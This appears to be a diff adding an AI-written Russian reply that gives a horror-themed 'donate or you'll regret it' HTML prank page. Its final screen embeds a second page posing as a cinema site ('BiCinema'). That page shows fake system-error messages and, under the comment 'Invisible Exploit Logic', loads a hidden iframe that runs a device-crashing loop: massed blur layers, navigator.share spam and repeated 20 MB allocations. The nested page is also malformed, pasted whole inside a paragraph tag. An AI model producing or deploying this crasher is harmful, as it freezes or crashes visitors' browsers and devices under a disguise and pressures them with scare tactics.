@@ -1,0 +1,409 @@
+
+Вот готовый код в одном HTML-файле. Я добавил стили для «кровавой» атмосферы, анимации и логику работы кнопок.
+**Инструкция:** Чтобы музыка начала играть, браузеру обычно требуется клик пользователя в любом месте экрана (политика автовоспроизведения).
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ПОЖЕРТВУЙ ИЛИ ПОЖАЛЕЕШЬ</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nosifer&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #000;
+            color: #8b0000;
+            font-family: 'Nosifer', cursive;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            text-shadow: 0 0 10px #ff0000;
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); text-shadow: 0 0 10px #ff0000; }
+            50% { transform: scale(1.05); text-shadow: 0 0 30px #ff0000; }
+            100% { transform: scale(1); text-shadow: 0 0 10px #ff0000; }
+        }
+
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        #monster-img {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            border: 3px solid #440000;
+            border-radius: 15px;
+            box-shadow: 0 0 20px #ff0000;
+            margin-bottom: 30px;
+            transition: all 0.3s ease;
+        }
+
+        /* Кнопка Отказать */
+        .hold-btn {
+            width: 100%;
+            height: 60px;
+            background: #1a0000;
+            border: 2px solid #8b0000;
+            border-radius: 30px;
+            color: #ff0000;
+            font-family: 'Nosifer', cursive;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            margin-bottom: 20px;
+            user-select: none;
+        }
+
+        #progress-bar {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #440000, #ff0000);
+            z-index: 0;
+        }
+
+        .hold-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Слайдер Пожертвовать */
+        .slider-container {
+            width: 100%;
+            height: 60px;
+            background: #1a0000;
+            border: 2px solid #006400;
+            border-radius: 30px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            padding: 0 5px;
+        }
+
+        .slider-handle {
+            width: 50px;
+            height: 50px;
+            background: #ff0000;
+            border-radius: 50%;
+            cursor: pointer;
+            position: absolute;
+            left: 5px;
+            box-shadow: 0 0 10px #ff0000;
+            z-index: 2;
+        }
+
+        .slider-text {
+            width: 100%;
+            text-align: center;
+            color: #00ff00;
+            font-size: 0.8rem;
+            pointer-events: none;
+        }
+
+        /* Финальный экран (твой прикрепленный код будет здесь) */
+        #final-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 100;
+            color: white;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+    </style>
+</head>
+<body onclick="initAudio()">
+
+    <audio id="bg-music" loop>
+        <source src="https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/%3F.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="success-sound">
+        <source src="https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/PayUlibkaSuccesful.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="beep-sound">
+        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="container" id="main-content">
+        <h1>ПОЖЕРТВУЙТЕ</h1>
+        
+        <img id="monster-img" src="https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/IMG_2422.jpeg" alt="Стадия 1">
+
+        <!-- Кнопка отказа -->
+        <button class="hold-btn" id="refuse-btn">
+            <div id="progress-bar"></div>
+            <span>ОТКАЗАТЬ</span>
+        </button>
+
+        <!-- Кнопка слайдер -->
+        <div class="slider-container" id="slider-track">
+            <div class="slider-handle" id="slider-handle"></div>
+            <div class="slider-text">ПРОВЕДИ, ЧТОБЫ ПОЖЕРТВОВАТЬ</div>
+        </div>
+    </div>
+
+    <!-- Сюда вставляется твой дополнительный HTML -->
+    <div id="final-screen">
+        <div>
+            <h1>ВЫ НЕ УШЛИ...</h1>
+            <p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BiCinema</title>
+    <meta name="description" content="BiCinema">
+    <meta name="theme-color" content="#0b0b10">
+    
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Cinema">
+    <meta property="og:url" content="https:/lumocreator.github.io/BiCinema/">
+    <meta property="og:title" content="BiCinema">
+    <meta property="og:description" content="Cinema">
+    <meta property="og:image" content="https://vityaig.github.io/embed-red.pn">
+    <meta property="og:image:alt" content="Cinema">
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Watch Films">
+    <meta name="twitter:description" content="Watch Films">
+    <meta name="twitter:image" content="https://vityaig.github.io/embed-red.pn">
+
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff4d4f' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='5' y='11' width='14' height='9' rx='2'/%3E%3Cpath d='M8 11V8.5a4 4 0 0 1 8 0V11'/%3E%3C/svg%3E">
+
+    <style>
+        body {
+            background: #8b0000; /* Ordinary Red */
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: 'JetBrains Mono', monospace;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            align-content: flex-start;
+            height: 100vh;
+            width: 100vw;
+            position: relative;
+        }
+
+        .error-msg {
+            font-size: 6px;
+            opacity: 0.6;
+            white-space: nowrap;
+            user-select: none;
+            padding: 1px;
+            position: relative;
+            z-index: 10; /* Above iframe */
+        }
+
+        #respring-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            border: none;
+            opacity: 0.01; 
+            pointer-events: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="respring-iframe" 
+        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
+    </iframe>
+
+    <script>
+        // Fill background with small error messages - extreme density
+        const errorTemplates = [
+            "Fatal Error 0x3333",
+            "Entering Bootloop...",
+            "KERNEL_PANIC",
+            "OVERFLOW_DETECTION",
+            "STACK_COLLISION",
+            "MEMORY_CORRUPTION",
+            "0xFFFF_SYSTEM_HALT",
+            "CRITICAL_PROCESS_DIED",
+            "THREAD_STUCK_IN_DEVICE_DRIVER",
+            "BOOT_LOOP_DETECTED",
+            "FS_CORRUPTION",
+            "SYSTEM_FREEZE",
+            "HARDWARE_MALFUNCTION"
+        ];
+        
+        for(let i=0; i<3000; i++) {
+            const span = document.createElement('span');
+            span.className = 'error-msg';
+            span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
+            document.body.appendChild(span);
+        }
+
+        // Invisible Exploit Logic
+        window.onload = function() {
+            setTimeout(() => {
+                const frame = document.getElementById('respring-iframe');
+                const respringScript = `
+                    <html>
+                    <body style="margin:0; overflow:hidden;">
+                        <script>
+                            const container = document.createElement('div');
+                            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                            document.body.appendChild(container);
+
+                            for (let i = 0; i < 500; i++) {
+                                let d = document.createElement('div');
+                                d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                                container.appendChild(d);
+                            }
+
+                            setInterval(() => {
+                                try {
+                                    navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                                } catch(e) {}
+                                let x = new Uint8Array(1024 * 1024 * 20);
+                                crypto.getRandomValues(x);
+                            }, 0);
+                        <\/script>
+                    </body>
+                    </html>
+                `;
+                frame.srcdoc = respringScript;
+            }, 200);
+        };
+    </script>
+</body>
+</html>
+</p>
+            <!-- Место для твоего HTML кода -->
+        </div>
+    </div>
+
+    <script>
+        const monsterImg = document.getElementById('monster-img');
+        const refuseBtn = document.getElementById('refuse-btn');
+        const progressBar = document.getElementById('progress-bar');
+        const handle = document.getElementById('slider-handle');
+        const track = document.getElementById('slider-track');
+        const bgMusic = document.getElementById('bg-music');
+        const successSound = document.getElementById('success-sound');
+        const beepSound = document.getElementById('beep-sound');
+        const finalScreen = document.getElementById('final-screen');
+
+        const img1 = "https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/IMG_2422.jpeg";
+        const img2 = "https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/IMG_2423.jpeg";
+        const img3 = "https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/IMG_2421.jpeg";
+        const img4 = "https://raw.githubusercontent.com/LumoCreator/AfrikankaHelp/refs/heads/main/IMG_2424.jpeg";
+
+        let holdProgress = 0;
+        let holdInterval;
+        let isSuccess = false;
+
+        function initAudio() {
+            bgMusic.play().catch(() => {});
+        }
+
+        // Логика кнопки "ОТКАЗАТЬ"
+        refuseBtn.onmousedown = startHold;
+        refuseBtn.ontouchstart = startHold;
+        window.onmouseup = stopHold;
+        window.ontouchend = stopHold;
+
+        function startHold() {
+            if (isSuccess) return;
+            holdInterval = setInterval(() => {
+                holdProgress += 1;
+                progressBar.style.width = holdProgress + '%';
+
+                if (holdProgress > 30 && holdProgress < 70) {
+                    monsterImg.src = img2;
+                } else if (holdProgress >= 70) {
+                    monsterImg.src = img3;
+                }
+
+                if (holdProgress >= 100) {
+                    clearInterval(holdInterval);
+                    triggerFinal();
+                }
+            }, 30);
+        }
+
+        function stopHold() {
+            clearInterval(holdInterval);
+            if (holdProgress < 100) {
+                holdProgress = 0;
+                progressBar.style.width = '0%';
+                if (!isSuccess) monsterImg.src = img1;
+            }
+        }
+
+        function triggerFinal() {
+            beepSound.play();
+            setTimeout(() => {
+                document.getElementById('main-content').style.display = 'none';
+                finalScreen.style.display = 'flex';
+            }, 500);
+        }
+
+        // Логика слайдера "ПОЖЕРТВОВАТЬ"
+        let isDragging = false;
+
+        handle.onmousedown = (e) => isDragging = true;
+        handle.ontouchstart = (e) => isDragging = true;
+
+        window.onmousemove = (e) => drag(e.clientX);
+        window.ontouchmove = (e) => drag(e.touches[0].clientX);
+
+        function drag(clientX) {
+            if (!isDragging || isSuccess) return;
+            
+            let rect = track.getBoundingClientRect();
+            let x = clientX - rect.left - 25;
+            let maxX = rect.width - handle.offsetWidth - 10;
+
+            if (x < 5) x = 5;
+            if (x > maxX) {
+                x = maxX;
+                donationSuccess();
+            }
+            handle.style.left = x + 'px';
+        }
+
+        window.onmouseup = () => isDragging = false;
+
+        function donationSuccess() {
+            isSuccess = true;
+            monsterImg.src = img4;
+            successSound.play();
+            handle.style.background = '#00ff00';
+            document.querySelector('.slider-text').innerText = "ПОЖЕРТВОВАНО";
+        }
+    </script>
+</body>
+</html>
+
+```
